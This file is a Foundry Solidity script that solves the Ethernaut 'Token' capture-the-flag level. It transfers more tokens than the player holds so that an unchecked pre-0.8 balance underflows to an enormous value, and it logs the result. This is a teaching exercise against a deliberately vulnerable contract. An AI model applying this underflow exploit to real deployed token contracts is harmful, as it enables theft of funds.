// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IToken} from "../src/interfaces/IToken.sol";

contract TokenScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        address player = vm.addr(privateKey);

        IToken target = IToken(instance);

        console2.log("--- Token Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Player Address :", player);

        uint256 currentBalance = target.balanceOf(player);
        console2.log("Current Balance:", currentBalance);

        // If player already has an enormous balance (e.g. from a previous test/call)
        if (currentBalance > 20) {
            console2.log(">>> Balance is already overflowing! You can submit the instance in Ethernaut. <<<");
            return;
        }

        vm.startBroadcast(privateKey);

        // Transfer 21 tokens when balance is 20 (or any amount > balance).
        // In Solidity <0.8.0, 20 - 21 underflows to 2^256 - 1.
        // We transfer to an arbitrary address (e.g. address(0xdead))
        address burnRecipient = address(0xdead);
        target.transfer(burnRecipient, 21);

        vm.stopBroadcast();

        uint256 newBalance = target.balanceOf(player);
        console2.log("Updated Balance:", newBalance);

        require(newBalance > 20, "Exploit failed: balance did not increase");
        console2.log(">>> SUCCESS! Balance underflowed to an astronomical amount! Submit instance in Ethernaut. <<<");
    }
}
